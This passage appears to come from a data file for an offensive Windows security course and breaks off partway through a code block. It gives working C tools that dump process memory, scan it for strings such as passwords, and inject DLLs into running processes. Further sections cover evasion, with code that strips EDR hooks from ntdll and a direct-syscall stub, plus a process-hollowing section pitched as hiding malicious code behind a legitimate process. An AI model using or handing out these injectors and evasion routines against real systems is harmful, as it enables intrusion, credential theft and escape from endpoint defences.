• File I/O for binary data`,
          code: `// PROCESS MEMORY DUMPER
// =====================

#include <windows.h>
#include <stdio.h>
#include <tlhelp32.h>
#include <psapi.h>

#pragma comment(lib, "psapi.lib")

// Find process by name
DWORD FindProcessByName(const wchar_t* procName) {
    HANDLE hSnap = CreateToolhelp32Snapshot(
        TH32CS_SNAPPROCESS, 0);
    
    if (hSnap == INVALID_HANDLE_VALUE) {
        wprintf(L"[!] CreateToolhelp32Snapshot failed\\n");
        return 0;
    }
    
    PROCESSENTRY32W pe32;
    pe32.dwSize = sizeof(pe32);
    
    if (!Process32FirstW(hSnap, &pe32)) {
        CloseHandle(hSnap);
        return 0;
    }
    
    do {
        if (_wcsicmp(pe32.szExeFile, procName) == 0) {
            CloseHandle(hSnap);
            wprintf(L"[+] Found %s (PID: %lu)\\n",
                    procName, pe32.th32ProcessID);
            return pe32.th32ProcessID;
        }
    } while (Process32NextW(hSnap, &pe32));
    
    CloseHandle(hSnap);
    return 0;
}

// Dump single memory region
BOOL DumpRegion(HANDLE hProc, 
                MEMORY_BASIC_INFORMATION* mbi,
                const wchar_t* outDir,
                DWORD regionNum) {
    
    // Allocate buffer
    BYTE* buffer = (BYTE*)malloc(mbi->RegionSize);
    if (!buffer) {
        wprintf(L"[!] malloc failed\\n");
        return FALSE;
    }
    
    // Read memory
    SIZE_T bytesRead = 0;
    BOOL result = ReadProcessMemory(
        hProc,
        mbi->BaseAddress,
        buffer,
        mbi->RegionSize,
        &bytesRead);
    
    if (!result || bytesRead == 0) {
        free(buffer);
        return FALSE;
    }
    
    // Build filename
    wchar_t filename[MAX_PATH];
    swprintf_s(filename, MAX_PATH,
        L"%s\\\\region_%03lu_0x%016llX.bin",
        outDir, regionNum,
        (ULONGLONG)mbi->BaseAddress);
    
    // Write to file
    HANDLE hFile = CreateFileW(
        filename,
        GENERIC_WRITE,
        0,
        NULL,
        CREATE_ALWAYS,
        FILE_ATTRIBUTE_NORMAL,
        NULL);
    
    if (hFile == INVALID_HANDLE_VALUE) {
        wprintf(L"[!] CreateFile failed: %lu\\n",
                GetLastError());
        free(buffer);
        return FALSE;
    }
    
    DWORD written = 0;
    WriteFile(hFile, buffer, 
              (DWORD)bytesRead, &written, NULL);
    
    CloseHandle(hFile);
    free(buffer);
    
    wprintf(L"[+] Dumped region %lu: 0x%016llX "
            L"[%6lluKB]\\n",
            regionNum,
            (ULONGLONG)mbi->BaseAddress,
            bytesRead / 1024);
    
    return TRUE;
}

// Create memory map file
void CreateMemoryMap(HANDLE hProc, 
                     const wchar_t* outDir) {
    wchar_t mapFile[MAX_PATH];
    swprintf_s(mapFile, MAX_PATH,
        L"%s\\\\memory_map.txt", outDir);
    
    HANDLE hFile = CreateFileW(
        mapFile,
        GENERIC_WRITE,
        0, NULL,
        CREATE_ALWAYS,
        FILE_ATTRIBUTE_NORMAL,
        NULL);
    
    if (hFile == INVALID_HANDLE_VALUE) {
        return;
    }
    
    wchar_t header[] = 
        L"MEMORY MAP\\r\\n"
        L"==========\\r\\n\\r\\n"
        L"Base Address        Size      "
        L"State    Protect    Type\\r\\n"
        L"----------------------------------"
        L"----------------------------------\\r\\n";
    
    DWORD written;
    WriteFile(hFile, header, 
              (DWORD)(wcslen(header) * sizeof(wchar_t)),
              &written, NULL);
    
    MEMORY_BASIC_INFORMATION mbi;
    LPVOID addr = NULL;
    
    while (VirtualQueryEx(hProc, addr, 
                          &mbi, sizeof(mbi))) {
        wchar_t line[512];
        swprintf_s(line, 512,
            L"0x%016llX  %8lluKB  "
            L"%-8s %-10s %-10s\\r\\n",
            (ULONGLONG)mbi.BaseAddress,
            (ULONGLONG)mbi.RegionSize / 1024,
            mbi.State == MEM_COMMIT ? L"COMMIT" :
            mbi.State == MEM_RESERVE ? L"RESERVE" :
            L"FREE",
            mbi.Protect == PAGE_EXECUTE ? L"X" :
            mbi.Protect == PAGE_EXECUTE_READ ? L"RX" :
            mbi.Protect == PAGE_EXECUTE_READWRITE ? 
                L"RWX" :
            mbi.Protect == PAGE_READWRITE ? L"RW" :
            mbi.Protect == PAGE_READONLY ? L"R" :
            L"NONE",
            mbi.Type == MEM_IMAGE ? L"IMAGE" :
            mbi.Type == MEM_MAPPED ? L"MAPPED" :
            mbi.Type == MEM_PRIVATE ? L"PRIVATE" :
            L"");
        
        WriteFile(hFile, line,
                  (DWORD)(wcslen(line) * 
                          sizeof(wchar_t)),
                  &written, NULL);
        
        addr = (BYTE*)mbi.BaseAddress + 
               mbi.RegionSize;
    }
    
    CloseHandle(hFile);
    wprintf(L"[+] Memory map created\\n");
}

// Main dump function
BOOL DumpProcess(DWORD pid, 
                 const wchar_t* outDir) {
    // Open process
    HANDLE hProc = OpenProcess(
        PROCESS_QUERY_INFORMATION | 
        PROCESS_VM_READ,
        FALSE, pid);
    
    if (!hProc) {
        wprintf(L"[!] OpenProcess failed: %lu\\n",
                GetLastError());
        wprintf(L"[!] Try running as Admin\\n");
        return FALSE;
    }
    
    wprintf(L"[+] Opened process %lu\\n", pid);
    
    // Create output directory
    CreateDirectoryW(outDir, NULL);
    
    // Enumerate and dump regions
    MEMORY_BASIC_INFORMATION mbi;
    LPVOID addr = NULL;
    DWORD regionNum = 0;
    DWORD dumped = 0;
    
    wprintf(L"[*] Enumerating memory regions...\\n");
    
    while (VirtualQueryEx(hProc, addr, 
                          &mbi, sizeof(mbi))) {
        // Only dump committed, readable memory
        if (mbi.State == MEM_COMMIT &&
            (mbi.Protect == PAGE_READONLY ||
             mbi.Protect == PAGE_READWRITE ||
             mbi.Protect == PAGE_EXECUTE_READ ||
             mbi.Protect == PAGE_EXECUTE_READWRITE)) {
            
            if (DumpRegion(hProc, &mbi, 
                          outDir, regionNum)) {
                dumped++;
            }
            regionNum++;
        }
        
        addr = (BYTE*)mbi.BaseAddress + 
               mbi.RegionSize;
    }
    
    wprintf(L"[+] Dumped %lu regions\\n", dumped);
    
    // Create memory map
    CreateMemoryMap(hProc, outDir);
    
    CloseHandle(hProc);
    return TRUE;
}

int wmain(int argc, wchar_t* argv[]) {
    wprintf(L"Process Memory Dumper\\n");
    wprintf(L"=====================\\n\\n");
    
    if (argc != 3) {
        wprintf(L"Usage: %s <process_name> "
                L"<output_dir>\\n", argv[0]);
        wprintf(L"Example: %s notepad.exe "
                L"C:\\\\dumps\\\\notepad\\n", argv[0]);
        return 1;
    }
    
    // Enable debug privilege
    if (!EnableDebugPrivilege()) {
        wprintf(L"[!] Failed to enable "
                L"SeDebugPrivilege\\n");
        return 1;
    }
    
    // Find process
    DWORD pid = FindProcessByName(argv[1]);
    if (pid == 0) {
        wprintf(L"[!] Process not found\\n");
        return 1;
    }
    
    // Dump process
    if (DumpProcess(pid, argv[2])) {
        wprintf(L"\\n[+] Dump complete!\\n");
        return 0;
    }
    
    return 1;
}

// TESTING:
// 1. Compile: cl dumper.c
// 2. Run as Admin: dumper.exe notepad.exe C:\\dumps
// 3. Check output directory for .bin files
// 4. Open memory_map.txt to see layout
// 5. Use hex editor to analyze .bin files`,
          language: "c"
        },
        {
          title: "Lab 2: Memory Scanner",
          content: `Build a tool that searches for byte patterns, strings, or values in process memory. Essential for game hacking, malware analysis, and finding specific data structures.

HOW IT WORKS:
1. Open target process with read access
2. Enumerate readable memory regions
3. Search each region for the specified pattern
4. Report all matches with addresses
5. Support multiple search types (bytes, strings, integers)

KEY CONCEPTS:
• Pattern matching algorithms (naive vs KMP)
• Handling partial reads at page boundaries
• Performance optimization for large address spaces
• Different data representations (hex, string, integer)
• Memory region filtering (skip unreadable/guard pages)

SEARCH TYPES:
• Byte patterns: "48 8B ?? ?? 89" (? = wildcard)
• ASCII strings: "password"
• Wide strings: L"password"
• Integers: Find DWORD value 1234
• Floats: Find health/ammo values

WHAT YOU'LL LEARN:
• Efficient memory scanning techniques
• Pattern matching with wildcards
• String encoding detection
• Performance optimization
• Result filtering and display`,
          code: `// MEMORY SCANNER
// ==============

#include <windows.h>
#include <stdio.h>
#include <tlhelp32.h>
#include <string.h>

// Pattern matching with wildcards
BOOL MatchPattern(const BYTE* data, 
                  const BYTE* pattern,
                  const BYTE* mask,
                  SIZE_T size) {
    for (SIZE_T i = 0; i < size; i++) {
        if (mask[i] && data[i] != pattern[i]) {
            return FALSE;
        }
    }
    return TRUE;
}

// Search for pattern in buffer
void SearchBuffer(const BYTE* buffer,
                  SIZE_T bufSize,
                  LPVOID baseAddr,
                  const BYTE* pattern,
                  const BYTE* mask,
                  SIZE_T patternSize,
                  DWORD* matchCount) {
    
    for (SIZE_T i = 0; 
         i <= bufSize - patternSize; 
         i++) {
        
        if (MatchPattern(&buffer[i], 
                        pattern, 
                        mask, 
                        patternSize)) {
            
            LPVOID matchAddr = 
                (BYTE*)baseAddr + i;
            
            wprintf(L"[+] Found at: 0x%016llX\\n",
                    (ULONGLONG)matchAddr);
            
            // Print context (16 bytes)
            wprintf(L"    ");
            for (SIZE_T j = 0; j < 16 && 
                 i + j < bufSize; j++) {
                wprintf(L"%02X ", buffer[i + j]);
            }
            wprintf(L"\\n");
            
            (*matchCount)++;
        }
    }
}

// Scan process memory for pattern
DWORD ScanProcess(HANDLE hProc,
                  const BYTE* pattern,
                  const BYTE* mask,
                  SIZE_T patternSize) {
    
    DWORD totalMatches = 0;
    MEMORY_BASIC_INFORMATION mbi;
    LPVOID addr = NULL;
    
    wprintf(L"[*] Scanning memory...\\n\\n");
    
    while (VirtualQueryEx(hProc, addr, 
                          &mbi, sizeof(mbi))) {
        
        // Only scan committed, readable memory
        if (mbi.State == MEM_COMMIT &&
            mbi.Protect != PAGE_NOACCESS &&
            mbi.Protect != PAGE_GUARD &&
            !(mbi.Protect & PAGE_GUARD)) {
            
            // Allocate buffer
            BYTE* buffer = (BYTE*)malloc(
                mbi.RegionSize);
            
            if (buffer) {
                SIZE_T bytesRead = 0;
                
                if (ReadProcessMemory(
                        hProc,
                        mbi.BaseAddress,
                        buffer,
                        mbi.RegionSize,
                        &bytesRead) && 
                    bytesRead > 0) {
                    
                    // Search buffer
                    SearchBuffer(
                        buffer,
                        bytesRead,
                        mbi.BaseAddress,
                        pattern,
                        mask,
                        patternSize,
                        &totalMatches);
                }
                
                free(buffer);
            }
        }
        
        addr = (BYTE*)mbi.BaseAddress + 
               mbi.RegionSize;
    }
    
    return totalMatches;
}

// Parse hex pattern string
// Format: "48 8B ?? ?? 89" (? = wildcard)
BOOL ParseHexPattern(const wchar_t* str,
                     BYTE** outPattern,
                     BYTE** outMask,
                     SIZE_T* outSize) {
    
    // Count bytes
    SIZE_T count = 0;
    const wchar_t* p = str;
    while (*p) {
        if (*p != L' ') count++;
        while (*p && *p != L' ') p++;
        while (*p == L' ') p++;
    }
    count /= 2;
    
    if (count == 0) return FALSE;
    
    *outPattern = (BYTE*)malloc(count);
    *outMask = (BYTE*)malloc(count);
    *outSize = count;
    
    // Parse bytes
    p = str;
    SIZE_T idx = 0;
    
    while (*p && idx < count) {
        while (*p == L' ') p++;
        
        if (p[0] == L'?' && p[1] == L'?') {
            // Wildcard
            (*outPattern)[idx] = 0;
            (*outMask)[idx] = 0;
            p += 2;
        } else {
            // Hex byte
            wchar_t hex[3] = {p[0], p[1], 0};
            (*outPattern)[idx] = 
                (BYTE)wcstoul(hex, NULL, 16);
            (*outMask)[idx] = 1;
            p += 2;
        }
        
        idx++;
    }
    
    return TRUE;
}

// Search for ASCII string
DWORD ScanForString(HANDLE hProc,
                    const char* str) {
    SIZE_T len = strlen(str);
    return ScanProcess(
        hProc,
        (const BYTE*)str,
        (const BYTE*)memset(
            malloc(len), 1, len),
        len);
}

// Search for wide string
DWORD ScanForWideString(HANDLE hProc,
                        const wchar_t* str) {
    SIZE_T len = wcslen(str) * 
                 sizeof(wchar_t);
    
    BYTE* mask = (BYTE*)malloc(len);
    memset(mask, 1, len);
    
    return ScanProcess(
        hProc,
        (const BYTE*)str,
        mask,
        len);
}

// Search for DWORD value
DWORD ScanForDword(HANDLE hProc,
                   DWORD value) {
    BYTE mask[4] = {1, 1, 1, 1};
    return ScanProcess(
        hProc,
        (const BYTE*)&value,
        mask,
        sizeof(DWORD));
}

int wmain(int argc, wchar_t* argv[]) {
    wprintf(L"Memory Scanner\\n");
    wprintf(L"==============\\n\\n");
    
    if (argc < 4) {
        wprintf(L"Usage:\\n");
        wprintf(L"  %s <pid> bytes "
                L"<pattern>\\n", argv[0]);
        wprintf(L"  %s <pid> string "
                L"<text>\\n", argv[0]);
        wprintf(L"  %s <pid> wide "
                L"<text>\\n", argv[0]);
        wprintf(L"  %s <pid> dword "
                L"<value>\\n", argv[0]);
        wprintf(L"\\nExamples:\\n");
        wprintf(L"  %s 1234 bytes "
                L"\\"48 8B ?? ?? 89\\"\\n", argv[0]);
        wprintf(L"  %s 1234 string "
                L"password\\n", argv[0]);
        wprintf(L"  %s 1234 dword "
                L"1000\\n", argv[0]);
        return 1;
    }
    
    DWORD pid = wcstoul(argv[1], NULL, 10);
    const wchar_t* type = argv[2];
    const wchar_t* search = argv[3];
    
    // Enable debug privilege
    EnableDebugPrivilege();
    
    // Open process
    HANDLE hProc = OpenProcess(
        PROCESS_QUERY_INFORMATION | 
        PROCESS_VM_READ,
        FALSE, pid);
    
    if (!hProc) {
        wprintf(L"[!] OpenProcess failed: %lu\\n",
                GetLastError());
        return 1;
    }
    
    wprintf(L"[+] Opened process %lu\\n", pid);
    wprintf(L"[*] Search type: %s\\n", type);
    wprintf(L"[*] Pattern: %s\\n\\n", search);
    
    DWORD matches = 0;
    
    if (wcscmp(type, L"bytes") == 0) {
        BYTE* pattern;
        BYTE* mask;
        SIZE_T size;
        
        if (ParseHexPattern(search, 
                           &pattern, 
                           &mask, &size)) {
            matches = ScanProcess(hProc, 
                                 pattern, 
                                 mask, size);
            free(pattern);
            free(mask);
        }
    }
    else if (wcscmp(type, L"string") == 0) {
        // Convert to ASCII
        char str[256];
        wcstombs_s(NULL, str, 256, 
                   search, _TRUNCATE);
        matches = ScanForString(hProc, str);
    }
    else if (wcscmp(type, L"wide") == 0) {
        matches = ScanForWideString(
            hProc, search);
    }
    else if (wcscmp(type, L"dword") == 0) {
        DWORD value = wcstoul(
            search, NULL, 10);
        matches = ScanForDword(hProc, value);
    }
    
    wprintf(L"\\n[+] Found %lu matches\\n", 
            matches);
    
    CloseHandle(hProc);
    return 0;
}

// TESTING:
// 1. Open notepad.exe, type "secret123"
// 2. Get PID from Task Manager
// 3. Run: scanner.exe <pid> string secret123
// 4. Try: scanner.exe <pid> bytes "48 8B"
// 5. Try: scanner.exe <pid> dword 1000`,
          language: "c"
        },
        {
          title: "Lab 3: Simple DLL Injector",
          content: `Build a tool that injects a DLL into a running process using the classic CreateRemoteThread technique. This is the foundation for process hooking, game modding, and security testing.

HOW IT WORKS:
1. Open target process with full access
2. Allocate memory in target for DLL path
3. Write DLL path to allocated memory
4. Get address of LoadLibraryW in kernel32.dll
5. Create remote thread calling LoadLibraryW with DLL path
6. Wait for thread to complete
7. Clean up allocated memory

KEY CONCEPTS:
• Kernel32.dll is mapped at the same address in all processes
• LoadLibraryW address is thus valid across processes
• CreateRemoteThread executes code in target context
• DLL_PROCESS_ATTACH runs in target process
• Thread handle must be waited on and closed

SECURITY CONSIDERATIONS:
• Requires PROCESS_ALL_ACCESS permissions
• May be blocked by antivirus (false positive)
• Protected processes cannot be injected
• DEP/ASLR doesn't prevent this technique
• Modern games use anti-cheat to detect this

WHAT YOU'LL LEARN:
• Remote memory allocation
• Cross-process function calls
• DLL loading mechanics
• Thread synchronization
• Error handling and cleanup`,
          code: `// DLL INJECTOR
// ============

#include <windows.h>
#include <stdio.h>
#include <tlhelp32.h>

// Inject DLL into process
BOOL InjectDLL(DWORD pid, 
               const wchar_t* dllPath) {
    
    wprintf(L"[*] Target PID: %lu\\n", pid);
    wprintf(L"[*] DLL: %s\\n\\n", dllPath);
    
    // Verify DLL exists
    if (GetFileAttributesW(dllPath) == 
        INVALID_FILE_ATTRIBUTES) {
        wprintf(L"[!] DLL not found\\n");
        return FALSE;
    }
    
    // Open target process
    wprintf(L"[*] Opening process...\\n");
    
    HANDLE hProc = OpenProcess(
        PROCESS_CREATE_THREAD |
        PROCESS_QUERY_INFORMATION |
        PROCESS_VM_OPERATION |
        PROCESS_VM_WRITE |
        PROCESS_VM_READ,
        FALSE, pid);
    
    if (!hProc) {
        wprintf(L"[!] OpenProcess failed: %lu\\n",
                GetLastError());
        wprintf(L"[!] Try running as Admin\\n");
        return FALSE;
    }
    
    wprintf(L"[+] Process opened\\n");
    
    // Allocate memory in target
    SIZE_T pathSize = (wcslen(dllPath) + 1) * 
                      sizeof(wchar_t);
    
    wprintf(L"[*] Allocating memory "
            L"(%zu bytes)...\\n", pathSize);
    
    LPVOID pRemoteBuf = VirtualAllocEx(
        hProc,
        NULL,
        pathSize,
        MEM_COMMIT | MEM_RESERVE,
        PAGE_READWRITE);
    
    if (!pRemoteBuf) {
        wprintf(L"[!] VirtualAllocEx failed: "
                L"%lu\\n", GetLastError());
        CloseHandle(hProc);
        return FALSE;
    }
    
    wprintf(L"[+] Memory allocated at: "
            L"0x%p\\n", pRemoteBuf);
    
    // Write DLL path to target
    wprintf(L"[*] Writing DLL path...\\n");
    
    SIZE_T written = 0;
    BOOL result = WriteProcessMemory(
        hProc,
        pRemoteBuf,
        dllPath,
        pathSize,
        &written);
    
    if (!result || written != pathSize) {
        wprintf(L"[!] WriteProcessMemory failed: "
                L"%lu\\n", GetLastError());
        VirtualFreeEx(hProc, pRemoteBuf, 
                      0, MEM_RELEASE);
        CloseHandle(hProc);
        return FALSE;
    }
    
    wprintf(L"[+] DLL path written "
            L"(%zu bytes)\\n", written);
    
    // Get LoadLibraryW address
    wprintf(L"[*] Getting LoadLibraryW "
            L"address...\\n");
    
    HMODULE hKernel32 = GetModuleHandleW(
        L"kernel32.dll");
    
    if (!hKernel32) {
        wprintf(L"[!] GetModuleHandle failed\\n");
        VirtualFreeEx(hProc, pRemoteBuf, 
                      0, MEM_RELEASE);
        CloseHandle(hProc);
        return FALSE;
    }
    
    LPVOID pLoadLibrary = (LPVOID)
        GetProcAddress(hKernel32, 
                       "LoadLibraryW");
    
    if (!pLoadLibrary) {
        wprintf(L"[!] GetProcAddress failed\\n");
        VirtualFreeEx(hProc, pRemoteBuf, 
                      0, MEM_RELEASE);
        CloseHandle(hProc);
        return FALSE;
    }
    
    wprintf(L"[+] LoadLibraryW at: 0x%p\\n",
            pLoadLibrary);
    
    // Create remote thread
    wprintf(L"[*] Creating remote thread...\\n");
    
    HANDLE hThread = CreateRemoteThread(
        hProc,
        NULL,
        0,
        (LPTHREAD_START_ROUTINE)pLoadLibrary,
        pRemoteBuf,
        0,
        NULL);
    
    if (!hThread) {
        wprintf(L"[!] CreateRemoteThread failed: "
                L"%lu\\n", GetLastError());
        VirtualFreeEx(hProc, pRemoteBuf, 
                      0, MEM_RELEASE);
        CloseHandle(hProc);
        return FALSE;
    }
    
    wprintf(L"[+] Remote thread created\\n");
    wprintf(L"[*] Waiting for thread...\\n");
    
    // Wait for thread to complete
    WaitForSingleObject(hThread, INFINITE);
    
    // Get thread exit code (HMODULE of loaded DLL)
    DWORD exitCode = 0;
    GetExitCodeThread(hThread, &exitCode);
    
    if (exitCode == 0) {
        wprintf(L"[!] DLL failed to load\\n");
        wprintf(L"[!] Check DLL architecture "
                L"matches process\\n");
    } else {
        wprintf(L"[+] DLL loaded! HMODULE: "
                L"0x%08lX\\n", exitCode);
    }
    
    // Cleanup
    wprintf(L"[*] Cleaning up...\\n");
    CloseHandle(hThread);
    VirtualFreeEx(hProc, pRemoteBuf, 
                  0, MEM_RELEASE);
    CloseHandle(hProc);
    
    wprintf(L"[+] Injection complete!\\n");
    return exitCode != 0;
}

int wmain(int argc, wchar_t* argv[]) {
    wprintf(L"Simple DLL Injector\\n");
    wprintf(L"===================\\n\\n");
    
    if (argc != 3) {
        wprintf(L"Usage: %s <pid> <dll_path>\\n",
                argv[0]);
        wprintf(L"Example: %s 1234 "
                L"C:\\\\test.dll\\n", argv[0]);
        return 1;
    }
    
    DWORD pid = wcstoul(argv[1], NULL, 10);
    const wchar_t* dllPath = argv[2];
    
    // Enable debug privilege
    if (!EnableDebugPrivilege()) {
        wprintf(L"[!] Failed to enable "
                L"SeDebugPrivilege\\n");
        return 1;
    }
    
    // Convert to absolute path
    wchar_t fullPath[MAX_PATH];
    GetFullPathNameW(dllPath, MAX_PATH, 
                     fullPath, NULL);
    
    // Inject DLL
    if (InjectDLL(pid, fullPath)) {
        wprintf(L"\\n[+] Success!\\n");
        return 0;
    }
    
    wprintf(L"\\n[!] Injection failed\\n");
    return 1;
}

// SAMPLE DLL CODE
// ===============

/*
// Save as test_dll.c
#include <windows.h>
#include <stdio.h>

BOOL APIENTRY DllMain(HMODULE hModule,
                      DWORD reason,
                      LPVOID reserved) {
    if (reason == DLL_PROCESS_ATTACH) {
        // This runs in target process!
        
        // Show message box
        MessageBoxW(NULL,
            L"DLL Injected Successfully!",
            L"Injection Test",
            MB_OK | MB_ICONINFORMATION);
        
        // Or create a thread
        CreateThread(NULL, 0,
            MyThreadFunc, NULL, 0, NULL);
        
        // Or hook APIs
        // HookFunction(...);
    }
    
    return TRUE;
}

// Compile DLL:
// cl /LD test_dll.c /link 
//    /DEF:exports.def

// exports.def:
EXPORTS
    DllMain
*/

// TESTING:
// 1. Compile injector: cl injector.c
// 2. Compile test DLL (see above)
// 3. Start notepad.exe
// 4. Get PID from Task Manager
// 5. Run: injector.exe <pid> test_dll.dll
// 6. Message box should appear in notepad

// TROUBLESHOOTING:
// • "Failed to load": Wrong architecture 
//   (x86 DLL in x64 process)
// • "Access denied": Run as Administrator
// • No message box: Check DllMain code
// • Crashes: Verify DLL exports correctly`,
          language: "c"
        },
        {
          title: "Next Steps & Advanced Techniques",
          content: `Congratulations! You've built three fundamental security tools. Here's how to take your skills further:

ADVANCED INJECTION TECHNIQUES:
• Manual Mapping - Bypass LoadLibrary detection by manually mapping PE
• Reflective DLL Injection - DLL loads itself without touching disk
• Process Hollowing - Replace legitimate process with malicious code
• Thread Hijacking - Inject via existing threads instead of CreateRemoteThread
• APC Injection - Queue injection via Asynchronous Procedure Calls

EVASION TECHNIQUES:
• Direct Syscalls - Bypass user-mode hooks by calling NT APIs directly
• API Unhooking - Remove EDR hooks from ntdll.dll
• Heaven's Gate - Use x86/x64 transition to evade hooks
• ETW Patching - Disable Event Tracing for Windows
• AMSI Bypass - Disable Antimalware Scan Interface

TOOL IMPROVEMENTS:
• Add GUI using Win32 or Qt
• Implement pattern signature scanning
• Support memory patching and modification
• Add module enumeration and analysis
• Create persistent injection (survives process restart)

DEBUGGING & ANALYSIS:
• Learn to use x64dbg for dynamic analysis
• Master WinDbg for kernel debugging
• Study PE format in depth
• Understand IAT/EAT hooking
• Practice with Cheat Engine for reverse engineering

DEFENSIVE PERSPECTIVE:
• Learn how EDR detects these techniques
• Study Windows API hooking
• Understand kernel callbacks
• Research PatchGuard and Driver Signature Enforcement
• Analyze real malware samples (in sandboxed environment!)

RESOURCES:
• Detecting Windows Malware - Michael Sikorski
• Windows Internals - Russinovich & Solomon
• Practical Malware Analysis - Sikorski & Honig
• OpenSecurityTraining courses
• MalwareTech blog
• hasherezade's GitHub

LEGAL REMINDER:
All techniques taught here are for educational and authorized security testing only. Always get written permission before testing on systems you don't own.

FINAL PROJECT IDEAS:
1. Build a process monitor that logs all API calls
2. Create a memory forensics tool for analyzing dumps
3. Develop a simple rootkit detector
4. Build a sandbox escape testing framework
5. Create an anti-debugging detection tool`,
          code: `// ADVANCED: Manual Map Injection Skeleton
// =========================================
// This is a preview of advanced techniques

#include <windows.h>
#include <stdio.h>

// Function that will run in target process
DWORD WINAPI LoadLibraryShellcode(
    LPVOID lpParam) {
    
    // This is where manual mapping logic goes
    // 1. Parse PE headers
    // 2. Allocate memory for sections
    // 3. Copy sections to allocated memory
    // 4. Process relocations
    // 5. Resolve imports
    // 6. Call DllMain
    // 7. Return HMODULE
    
    return 0;
}

// Direct Syscall Example
// ======================
// Bypass hooks by calling kernel directly

typedef NTSTATUS (NTAPI *pNtAllocateVirtualMemory)(
    HANDLE ProcessHandle,
    PVOID* BaseAddress,
    ULONG_PTR ZeroBits,
    PSIZE_T RegionSize,
    ULONG AllocationType,
    ULONG Protect
);

NTSTATUS DirectSyscallAlloc(
    HANDLE hProcess,
    PVOID* BaseAddress,
    SIZE_T* RegionSize) {
    
    // Get syscall number for NtAllocateVirtualMemory
    // This varies by Windows version!
    WORD syscallNumber = 0x18; // Win10 x64
    
    // Call via inline assembly or syscall stub
    // __asm {
    //     mov r10, rcx
    //     mov eax, syscallNumber
    //     syscall
    // }
    
    return 0; // Placeholder
}

// API Unhooking Example
// =====================
// Remove EDR hooks from ntdll.dll

BOOL UnhookNtdll() {
    // 1. Map fresh ntdll.dll from disk
    HANDLE hFile = CreateFileW(
        L"C:\\\\Windows\\\\System32\\\\ntdll.dll",
        GENERIC_READ, FILE_SHARE_READ,
        NULL, OPEN_EXISTING, 0, NULL);
    
    if (hFile == INVALID_HANDLE_VALUE)
        return FALSE;
    
    HANDLE hMapping = CreateFileMappingW(
        hFile, NULL, PAGE_READONLY, 0, 0, NULL);
    CloseHandle(hFile);
    
    if (!hMapping) return FALSE;
    
    LPVOID pMapping = MapViewOfFile(
        hMapping, FILE_MAP_READ, 0, 0, 0);
    CloseHandle(hMapping);
    
    if (!pMapping) return FALSE;
    
    // 2. Get current ntdll.dll in memory
    HMODULE hNtdll = GetModuleHandleW(L"ntdll.dll");
    
    // 3. Parse PE to find .text section
    PIMAGE_DOS_HEADER pDos = 
        (PIMAGE_DOS_HEADER)pMapping;
    PIMAGE_NT_HEADERS pNt = 
        (PIMAGE_NT_HEADERS)((BYTE*)pMapping + 
                            pDos->e_lfanew);
    
    // 4. Copy clean .text over hooked version
    // (Implementation left as exercise)
    
    UnmapViewOfFile(pMapping);
    
    wprintf(L"[+] Ntdll.dll unhooked\\n");
    return TRUE;
}

// FURTHER STUDY:
// ==============
// 1. Complete the manual map implementation
// 2. Research syscall number retrieval
// 3. Study EDR bypass techniques
// 4. Learn kernel driver development
// 5. Analyze real-world malware

// CAUTION: These techniques can be detected
// by modern EDR solutions. Study detection
// methods alongside evasion techniques!`,
          language: "c"
        }
      ]
    },
    "process-injection": {
      title: "Process Injection & Memory Manipulation",
      sections: [
        {
          title: "1. Classic DLL Injection - The Foundation",
          content: `DLL injection forces a remote process to load your DLL by allocating memory, writing the path, and creating a remote thread that calls LoadLibrary.

WHY IT WORKS:
• Every process can call LoadLibrary to load DLLs
• CreateRemoteThread creates a thread in another process
• The thread executes your specified function (LoadLibraryA)
• Your DLL's DllMain runs in the target's context

DETECTION SURFACE:
• CreateRemoteThread is heavily monitored by EDR
• WriteProcessMemory to executable memory triggers alerts
• Suspicious modules loaded detected by module enumeration`,
          code: `#include <windows.h>
#include <stdio.h>

BOOL InjectDLL(DWORD dwPid, const char* szDll) {
    // 1. Open target process
    HANDLE hProcess = OpenProcess(
        PROCESS_ALL_ACCESS, FALSE, dwPid);
    
    if (!hProcess) {
        printf("[-] OpenProcess failed: %lu\\n", 
               GetLastError());
        return FALSE;
    }
    
    // 2. Allocate memory for DLL path
    SIZE_T pathLen = strlen(szDll) + 1;
    LPVOID pRemoteBuf = VirtualAllocEx(
        hProcess, NULL, pathLen,
        MEM_COMMIT | MEM_RESERVE,
        PAGE_READWRITE);
    
    if (!pRemoteBuf) {
        printf("[-] VirtualAllocEx failed\\n");
        CloseHandle(hProcess);
        return FALSE;
    }
    
    // 3. Write DLL path to remote memory
    if (!WriteProcessMemory(hProcess, pRemoteBuf,
                            szDll, pathLen, NULL)) {
        printf("[-] WriteProcessMemory failed\\n");
        VirtualFreeEx(hProcess, pRemoteBuf, 
                      0, MEM_RELEASE);
        CloseHandle(hProcess);
        return FALSE;
    }
    
    // 4. Get LoadLibraryA address
    HMODULE hKernel32 = GetModuleHandleA("kernel32.dll");
    LPTHREAD_START_ROUTINE pfnLoadLib = 
        (LPTHREAD_START_ROUTINE)GetProcAddress(
            hKernel32, "LoadLibraryA");
    
    // 5. Create remote thread
    HANDLE hThread = CreateRemoteThread(
        hProcess, NULL, 0, pfnLoadLib,
        pRemoteBuf, 0, NULL);
    
    if (!hThread) {
        printf("[-] CreateRemoteThread failed\\n");
        VirtualFreeEx(hProcess, pRemoteBuf, 
                      0, MEM_RELEASE);
        CloseHandle(hProcess);
        return FALSE;
    }
    
    // 6. Wait and cleanup
    WaitForSingleObject(hThread, INFINITE);
    
    printf("[+] DLL injected successfully\\n");
    
    CloseHandle(hThread);
    VirtualFreeEx(hProcess, pRemoteBuf, 
                  0, MEM_RELEASE);
    CloseHandle(hProcess);
    
    return TRUE;
}

// Example DLL (inject_dll.c)
// Compile: cl /LD inject_dll.c

BOOL APIENTRY DllMain(HMODULE hModule,
                      DWORD reason,
                      LPVOID lpReserved) {
    switch (reason) {
    case DLL_PROCESS_ATTACH:
        MessageBoxA(NULL, 
            "Injected!", "Success", MB_OK);
        // Run your payload here
        break;
    }
    return TRUE;
}`,
          language: "c"
        },
        {
          title: "2. Process Hollowing - Running in Plain Sight",
          content: `Process hollowing creates a legitimate process in suspended state, replaces its memory with malicious code, then resumes execution. The process appears legitimate in Task Manager but runs your code.

TECHNIQUE BREAKDOWN:
1. Create legitimate process suspended (CREATE_SUSPENDED)
2. Get its base address from PEB
3. Unmap the legitimate image (NtUnmapViewOfSection)
4. Allocate new memory at same base
5. Write malicious PE file
6. Fix entry point in thread context
7. Resume thread

EVASION BENEFITS:
• Legitimate process name in Task Manager
• Legitimate parent-child relationship
• Signature verification passes (for host process)`,
          code: `#include <windows.h>
#include <winternl.h>
#include <stdio.h>

